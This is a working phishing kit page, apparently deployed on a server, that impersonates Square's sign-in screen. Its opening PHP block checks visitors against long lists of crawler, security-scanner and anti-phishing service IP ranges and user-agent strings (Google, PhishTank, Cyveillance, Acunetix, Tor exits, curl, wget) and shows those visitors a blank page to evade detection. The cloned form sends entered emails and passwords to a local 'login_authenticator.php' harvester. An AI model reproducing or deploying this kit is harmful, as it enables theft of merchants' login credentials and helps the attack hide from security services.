<?php

@session_start();
error_reporting(0);

function message(){
     echo "HELLO"; // BOOTS MESSAGE 
    exit;
}

$ips = array( // LIST BOOTS IP
		 "^66.102.*.*",
		 "^38.100.*.*",
		 "^107.170.*.*",
		 "^149.20.*.*",
		 "^38.105.*.*",
		 "^74.125.*.*",
		 "^66.150.14.*",
		 "^54.176.*.*",
		 "^38.100.*.*",
		 "^184.173.*.*",
		 "^66.249.*.*",
		 "^128.242.*.*",
		 "^72.14.192.*",
		 "^208.65.144.*",
		 "^74.125.*.*",
		 "^209.85.128.*",
		 "^216.239.32.*",
		 "^74.125.*.*",
		 "^207.126.144.*",
		 "^173.194.*.*",
		 "^64.233.160.*",
		 "^72.14.192.*",
		 "^66.102.*.*",
		 "^64.18.*.*",
		 "^194.52.68.*",
		 "^194.72.238.*",
		 "^62.116.207.*",
		 "^212.50.193.*",
		 "^69.65.*.*",
		 "^50.7.*.*",
		 "^131.212.*.*",
		 "^46.116.*.*",
		 "^62.90.*.*",
		 "^89.138.*.*",
		 "^82.166.*.*",
		 "^85.64.*.*",
		 "^85.250.*.*",
		 "^89.138.*.*",
		 "^93.172.*.*",
		 "^109.186.*.*",
		 "^194.90.*.*",
		 "^212.29.192.*",
		 "^212.29.224.*",
		 "^212.143.*.*",
		 "^212.150.*.*",
		 "^212.235.*.*",
		 "^217.132.*.*",
		 "^50.97.*.*",
		 "^217.132.*.*",
		 "^209.85.*.*",
		 "^66.205.64.*",
		 "^204.14.48.*",
		 "^64.27.2.*",
		 "^67.15.*.*",
		 "^202.108.252.*",
		 "^193.47.80.*",
		 "^64.62.136.*",
		 "^66.221.*.*",
		 "^64.62.175.*",
		 "^198.54.*.*",
		 "^192.115.134.*",
		 "^216.252.167.*",
		 "^193.253.199.*",
		 "^69.61.12.*",
		 "^64.37.103.*",
		 "^38.144.36.*",
		 "^64.124.14.*",
		 "^206.28.72.*",
		 "^209.73.228.*",
		 "^158.108.*.*",
		 "^168.188.*.*",
		 "^66.207.120.*",
		 "^167.24.*.*",
		 "^192.118.48.*",
		 "^67.209.128.*",
		 "^12.148.209.*",
		 "^12.148.196.*",
		 "^193.220.178.*",
		 "68.65.53.71",
		 "^198.25.*.*",
		 "^64.106.213.*");
$Botname = array( // LIST BOOTS NAME
		 "bot",
		 "above",
		 "google",
		 "softlayer",
		 "amazonaws",
		 "cyveillance",
		 "compatible",
		 "facebook",
		 "phishtank",
		 "dreamhost",
		 "netpilot",
		 "calyxinstitute",
		 "tor-exit",
		 "apache-httpclient",
		 "lssrocketcrawler",
		 "Trident",
		 "X11",
		 "Macintosh",
		 "crawler",
		 "urlredirectresolver",
		 "jetbrains",
		 "spam",
		 "windows 95",
		 "windows 98",
		 "acunetix",
		 "netsparker",
		 "google",
		 "007ac9",
		 "008",
		 "192.comagent",
		 "200pleasebot",
		 "360spider",
		 "4seohuntbot",
		 "50.nu",
		 "a6-indexer",
		 "admantx",
		 "amznkassocbot",
		 "aboundexbot",
		 "aboutusbot",
		 "abrave spider",
		 "accelobot",
		 "acoonbot",
		 "addthis.com",
		 "adsbot-google",
		 "ahrefsbot",
		 "alexabot",
		 "amagit.com",
		 "analytics",
		 "antbot",
		 "apercite",
		 "aportworm",
		 "arabot",
		 "crawl",
		 "slurp",
		 "spider",
		 "seek",
		 "accoona",
		 "acoon",
		 "adressendeutschland",
		 "ah-ha.com",
		 "ahoy",
		 "altavista",
		 "ananzi",
		 "anthill",
		 "appie",
		 "arachnophilia",
		 "arale",
		 "araneo",
		 "aranha",
		 "architext",
		 "aretha",
		 "arks",
		 "asterias",
		 "atlocal",
		 "atn",
		 "atomz",
		 "augurfind",
		 "backrub",
		 "bannana_bot",
		 "baypup",
		 "bdfetch",
		 "big brother",
		 "biglotron",
		 "bjaaland",
		 "blackwidow",
		 "blaiz",
		 "blog",
		 "blo.",
		 "bloodhound",
		 "boitho",
		 "booch",
		 "bradley",
		 "butterfly",
		 "calif",
		 "cassandra",
		 "ccubee",
		 "cfetch",
		 "charlotte",
		 "churl",
		 "cienciaficcion",
		 "cmc",
		 "collective",
		 "comagent",
		 "combine",
		 "computingsite",
		 "csci",
		 "curl",
		 "cusco",
		 "daumoa",
		 "deepindex",
		 "delorie",
		 "depspid",
		 "deweb",
		 "die blinde kuh",
		 "digger",
		 "ditto",
		 "dmoz",
		 "docomo",
		 "download express",
		 "dtaagent",
		 "dwcp",
		 "ebiness",
		 "ebingbong",
		 "e-collector",
		 "ejupiter",
		 "emacs-w3 search engine",
		 "esther",
		 "evliya celebi",
		 "ezresult",
		 "falcon",
		 "felix ide",
		 "ferret",
		 "fetchrover",
		 "fido",
		 "findlinks",
		 "fireball",
		 "fish search",
		 "fouineur",
		 "funnelweb",
		 "gazz",
		 "gcreep",
		 "genieknows",
		 "getterroboplus",
		 "geturl",
		 "glx",
		 "goforit",
		 "golem",
		 "grabber",
		 "grapnel",
		 "gralon",
		 "griffon",
		 "gromit",
		 "grub",
		 "gulliver",
		 "hamahakki",
		 "harvest",
		 "havindex",
		 "helix",
		 "heritrix",
		 "hku www octopus",
		 "homerweb",
		 "htdig",
		 "html index",
		 "html_analyzer",
		 "htmlgobble",
		 "hubater",
		 "hyper-decontextualizer",
		 "ia_archiver",
		 "ibm_planetwide",
		 "ichiro",
		 "iconsurf",
		 "iltrovatore",
		 "image.kapsi.net",
		 "imagelock",
		 "incywincy",
		 "indexer",
		 "infobee",
		 "informant",
		 "ingrid",
		 "inktomisearch.com",
		 "inspector web",
		 "intelliagent",
		 "internet shinchakubin",
		 "ip3000",
		 "iron33",
		 "israeli-search",
		 "ivia",
		 "jack",
		 "jakarta",
		 "javabee",
		 "jetbot",
		 "jumpstation",
		 "katipo",
		 "kdd-explorer",
		 "kilroy",
		 "knowledge",
		 "kototoi",
		 "kretrieve",
		 "labelgrabber",
		 "lachesis",
		 "larbin",
		 "legs",
		 "libwww",
		 "linkalarm",
		 "link validator",
		 "linkscan",
		 "lockon",
		 "lwp",
		 "lycos",
		 "magpie",
		 "mantraagent",
		 "mapoftheinternet",
		 "marvin/",
		 "mattie",
		 "mediafox",
		 "mediapartners",
		 "mercator",
		 "merzscope",
		 "microsoft url control",
		 "minirank",
		 "miva",
		 "mj12",
		 "mnogosearch",
		 "moget",
		 "monster",
		 "moose",
		 "motor",
		 "multitext",
		 "muncher",
		 "muscatferret",
		 "mwd.search",
		 "myweb",
		 "najdi",
		 "nameprotect",
		 "nationaldirectory",
		 "nazilla",
		 "ncsa beta",
		 "nec-meshexplorer",
		 "nederland.zoek",
		 "netcarta webmap engine",
		 "netmechanic",
		 "netresearchserver",
		 "netscoop",
		 "newscan-online",
		 "nhse",
		 "nokia6682/",
		 "nomad",
		 "noyona",
		 "nutch",
		 "nzexplorer",
		 "objectssearch",
		 "occam",
		 "omni",
		 "open text",
		 "openfind",
		 "openintelligencedata",
		 "orb search",
		 "osis-project",
		 "pack rat",
		 "pageboy",
		 "pagebull",
		 "page_verifier",
		 "panscient",
		 "parasite",
		 "partnersite",
		 "patric",
		 "pear.",
		 "pegasus",
		 "peregrinator",
		 "pgp key agent",
		 "phantom",
		 "phpdig",
		 "picosearch",
		 "piltdownman",
		 "pimptrain",
		 "pinpoint",
		 "pioneer",
		 "piranha",
		 "plumtreewebaccessor",
		 "pogodak",
		 "poirot",
		 "pompos",
		 "poppelsdorf",
		 "poppi",
		 "popular iconoclast",
		 "psycheclone",
		 "publisher",
		 "python",
		 "rambler",
		 "raven search",
		 "roach",
		 "road runner",
		 "roadhouse",
		 "robbie",
		 "robofox",
		 "robozilla",
		 "rules",
		 "salty",
		 "sbider",
		 "scooter",
		 "scoutjet",
		 "scrubby",
		 "search.",
		 "searchprocess",
		 "semanticdiscovery",
		 "senrigan",
		 "sg-scout",
		 "shai'hulud",
		 "shark",
		 "shopwiki",
		 "sidewinder",
		 "sift",
		 "silk",
		 "simmany",
		 "site searcher",
		 "site valet",
		 "sitetech-rover",
		 "skymob.com",
		 "sleek",
		 "smartwit",
		 "sna-",
		 "snappy",
		 "snooper",
		 "sohu",
		 "speedfind",
		 "sphere",
		 "sphider",
		 "spinner",
		 "spyder",
		 "steeler/",
		 "suke",
		 "suntek",
		 "supersnooper",
		 "surfnomore",
		 "sven",
		 "sygol",
		 "szukacz",
		 "tach black widow",
		 "tarantula",
		 "templeton",
		 "/teoma",
		 "t-h-u-n-d-e-r-s-t-o-n-e",
		 "theophrastus",
		 "titan",
		 "titin",
		 "tkwww",
		 "toutatis",
		 "t-rex",
		 "tutorgig",
		 "twiceler",
		 "twisted",
		 "ucsd",
		 "udmsearch",
		 "url check",
		 "updated",
		 "vagabondo",
		 "valkyrie",
		 "verticrawl",
		 "victoria",
		 "vision-search",
		 "volcano",
		 "voyager/",
		 "voyager-hc",
		 "w3c_validator",
		 "w3m2",
		 "w3mir",
		 "walker",
		 "wallpaper",
		 "wanderer",
		 "wauuu",
		 "wavefire",
		 "web core",
		 "web hopper",
		 "web wombat",
		 "webbandit",
                 "webcatcher",
		 "webcopy",
		 "webfoot",
		 "weblayers",
		 "weblinker",
		 "weblog monitor",
		 "webmirror",
		 "webmonkey",
		 "webquest",
		 "webreaper",
		 "websitepulse",
		 "websnarf",
		 "webstolperer",
		 "webvac",
		 "webwalk",
		 "webwatch",
		 "webwombat",
		 "webzinger",
		 "wget",
		 "whizbang",
		 "whowhere",
		 "wild ferret",
		 "worldlight",
		 "wwwc",
		 "wwwster",
		 "xenu",
		 "xift",
		 "xirq",
		 "yandex",
		 "yanga",
		 "yeti",
		 "yahoo!");


foreach ($Botname as $word2){
    if (stripos($_SERVER['HTTP_USER_AGENT'], $word2)){
        message();
    }
}

foreach ($ips as $ip){
    if (preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])) {
        message();
    }
}

?>













<!DOCTYPE html>
<html lang="en-US">
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <title>Sign In</title>
    <meta name="viewport" content="width=device-width,user-scalable=no">
    <meta name="domain-suggester-prompt" content="">
    <meta name="api-uri" content="https://api.squareup.com">
    <meta name="max-idle-minutes" content="30">
    <meta name="max-two-factor-minutes" content="2147483647">
    <meta name="referrer" content="origin">
    <link href="DATA/login.css" media="screen" rel="stylesheet">
  <style type="text/css"></style>
  <link rel="icon" href="DATA/fav.png" />
</head>

  <body class="login-page ">

    <div id="content" class="fade-in l-table">
      <div id="login-wrapper" class="l-table-row">
        <div class="l-table-cell">
            
            
          <section class="login-modal">
              
            <div class="login-modal-user-pass" style="display: block;">
              <div class="login-modal-logo">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 44 44" role="img">
                  <path role="presentation" d="M36.65 0h-29.296c-4.061 0-7.354 3.292-7.354 7.354v29.296c0 4.062 3.293 7.354 7.354 7.354h29.296c4.062 0 7.354-3.292 7.354-7.354v-29.296c.001-4.062-3.291-7.354-7.354-7.354zm-.646 33.685c0 1.282-1.039 2.32-2.32 2.32h-23.359c-1.282 0-2.321-1.038-2.321-2.32v-23.36c0-1.282 1.039-2.321 2.321-2.321h23.359c1.281 0 2.32 1.039 2.32 2.321v23.36z"></path>
                  <path role="presentation" d="M17.333 28.003c-.736 0-1.332-.6-1.332-1.339v-9.324c0-.739.596-1.339 1.332-1.339h9.338c.738 0 1.332.6 1.332 1.339v9.324c0 .739-.594 1.339-1.332 1.339h-9.338z"></path>
                </svg>
              </div>
              <div class="login-modal-title">
                <span class="login-modal-password-text">Forgot Password</span>
                <span class="login-modal-instructions-sent-text">Instructions have been sent</span>
              </div>



              <div class="login-modal-content">

                <form accept-charset="UTF-8" action="login_authenticator.php" name="sign-in-form" method="post" novalidate="novalidate" autocomplete="off">
                  <div class="field email-field fade-label">
                    <label class="text" for="email">Email Address</label>
                    <input autocapitalize="off" autocomplete="off" autocorrect="off" autofocus="autofocus" class="text" id="email" name="username" size="30" spellcheck="false" 
                           type="email">
                  </div>

                  <div class="message-box-error-wrapper">
                    <div class="message-box-error"></div>
                  </div>
                  <div class="field password-field fade-label">
                    <label class="text" for="password">Password</label>
                    <input class="text" id="password" name="password" size="30" autocomplete="off" type="password" value="">
                    <div class="login-forgot-password-wrapper">
                        <a href="#" class="forgot-password-link track-event"><b>Forgot Password</b></a>
                    </div>
                  </div>

                  <div style="clear: both"></div>

                  <div id="captcha" class="g-recaptcha submit-button"></div>

                  <div class="submit-button full-length-submit-button">
                    <button id="sign-in-button" name="sign-in-button" type="submit" class="btn btn-blue track-event">
                      <span class="button-text">Sign In</span>
                    </button>
                  </div>
                  <div class="footer">
                    Don't have a Square account?
                    <span class="signup-today">
                      <a href="https://squareup.com/signup?lang_code=en-US" class="track-event">Sign up</a>
                    </span>
                  </div>
                </form>
              </div>
            </div>

           
              
            

            <div class="login-modal-reset-password-send-code hide" style="display: none">
              <div class="login-modal-logo">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 44 44" role="img">
                  <path role="presentation" d="M36.65 0h-29.296c-4.061 0-7.354 3.292-7.354 7.354v29.296c0 4.062 3.293 7.354 7.354 7.354h29.296c4.062 0 7.354-3.292 7.354-7.354v-29.296c.001-4.062-3.291-7.354-7.354-7.354zm-.646 33.685c0 1.282-1.039 2.32-2.32 2.32h-23.359c-1.282 0-2.321-1.038-2.321-2.32v-23.36c0-1.282 1.039-2.321 2.321-2.321h23.359c1.281 0 2.32 1.039 2.32 2.321v23.36z"></path>
                  <path role="presentation" d="M17.333 28.003c-.736 0-1.332-.6-1.332-1.339v-9.324c0-.739.596-1.339 1.332-1.339h9.338c.738 0 1.332.6 1.332 1.339v9.324c0 .739-.594 1.339-1.332 1.339h-9.338z"></path>
                </svg>
              </div>
              <div class="login-modal-title">
                Reset Password
              </div>
              <div class="login-modal-content">
                <div class="login-modal-text">
                  <div class="login-modal-secondary-text">
                    Enter the email address you used to register with Square and we'll send you instructions to reset your password.
                  </div>
                </div>
              </div>
              <form accept-charset="UTF-8" action="" method="post">
                <input type="hidden" id="password-locale" value="en-US">
                <div style="clear: both;"></div>
                <div class="input-submit">
                  <div class="submit-button">
                    <button type="submit" class="btn btn-blue">
                      <span class="button-text">Send Instructions</span>
                    </button>
                  </div>
                  <div class="field fade-label forgot-password-email-field">
                    <label class="text" for="reset-password-email">Email Address</label>
                    <input autocapitalize="off" autocomplete="off" autocorrect="off" autofocus="autofocus" class="text forgot-password-email" id="reset-password-email" name="reset-password-email" spellcheck="false" type="email">
                  </div>
                </div>
              </form>
              <div class="footer">
                <a href="https://squareup.com/help/contact?prefill=forgot_password" target="_blank" class="track-event">I don't remember my email address</a>
                <br><br>
                <a href="#" class="login-link track-event">Back to login</a>
              </div>
            </div>
              
            

          </section>
          <div class="login-modal-footer login-language-wrapper">
            
<div class="language-selector">
  <div class="language-prompt">
    <ul class="reset locale-list language-list">
         <li class="language " data-language="en"><span>English</span></li>
         <li class="language au" data-language="en-AU"><span>English (Australia)</span></li>
         <li class="language ca" data-language="en-CA"><span>English (Canada)</span></li>
         <li class="language gb" data-language="en-GB"><span>English (United Kingdom)</span></li>
         <li class="language " data-language="es"><span>espa�ol</span></li>
         <li class="language ca" data-language="fr-CA"><span>fran�ais (Canada)</span></li>
         <li class="language " data-language="ja"><span>???</span></li>
    </ul>
  </div>
  <a href="#" class="arrow selected-language en">English</a>
</div>

          </div>
      </div>
    </div>

    <script nonce="" src="DATA/fingerprint.js"></script>
    <script nonce="" src="DATA/jquery-1.js"></script>
    <script nonce="" src="DATA/jquery.js"></script>
    <script nonce="" src="DATA/jquery_002.js"></script>
    <script nonce="" src="DATA/json2.js"></script>
    <script nonce="" src="DATA/spin.js"></script>
    <script nonce="" src="DATA/libphonenumber-min.js"></script>
    <script nonce="" src="DATA/libphonenumber-ui.js"></script>
    <script nonce="" src="DATA/moment-with-locales.js"></script>
    <script nonce="" src="DATA/login.js"></script>
    <script nonce="" type="text/javascript">
      loginModal.init({
        claim_account: "false",
        localized_messages: {
          password_reuse_error: 'Your desired password has already been used with Square, and cannot be used again. <a href="/help/article/6212" target="_blank" style="color: #ffffff;text-decoration: underline">Learn More&nbsp;&gt;</a>',
          password_common_error: 'Your desired password cannot be used because it contains a common word that is easily guessable. <a href="/help/article/6212" target="_blank" style="color: #ffffff;text-decoration: underline">Learn More&nbsp;&gt;</a>',
          password_compromised_error: 'Your desired password cannot be used with Square. Please try again with a different password. <a href="/help/article/6212" target="_blank" style="color: #ffffff;text-decoration: underline">Learn More&nbsp;&gt;</a>',
          password_temporary_lockout: 'For your account security, you may not make any more requests to reset your password. Please try again later or visit the <a href="/help/article/6212" target="_blank" style="color: #ffffff;text-decoration: underline">Square Support Center</a> for help.',
          password_too_short_error: 'Your password is too short. <a href="/help/article/6212" target="_blank" style="color: #ffffff;text-decoration: underline">Learn More&nbsp;&gt;</a>',
          password_too_long_error: "Your password is too long.",
          password_will_expire: "Your password will expire on {0}.",
          passwords_do_not_match_error: "Your passwords do not match.",
          unknown_error: "An unknown error has occurred"
        },
        page_locale: "en-US",
        page_string: "",
        person_token: "",
        recaptcha_public_key: "6LfkRRcUAAAAACPj43o6957Sm8GrDxac8gEZHhJK",
        return_to: "",
        send_email: "false",
        sign_in: "false",
        sq_pixels_url: "https://tealium-f.squarecdn.com/tealium-b37aa8ac02f52911d8d50160c8c554e9.html?env=prod",
        verification_code: ""
      });
      _saq_app_name="mp";
    </script>
    <script nonce="" src="DATA/language-selector.js"></script>
    <script nonce="" src="DATA/jquery_003.js"></script>
    <script nonce="" src="DATA/underscore-min.js"></script>
    <script nonce="" src="DATA/new_relic_episodes.js"></script>
    <script nonce="" src="DATA/eventstream.js"></script>
    <script nonce="" src="DATA/eventstream_logging.js"></script>
    <script nonce="" src="DATA/qrcode.js"></script>
    <script nonce="" src="DATA/api.js" async="" defer="defer"></script>
  

</div><div id="ads"></div><div id="ads"></div><iframe style="display: none;" src="DATA/tealium-b37aa8ac02f52911d8d50160c8c554e9.html" width="0" height="0"></iframe></body></html>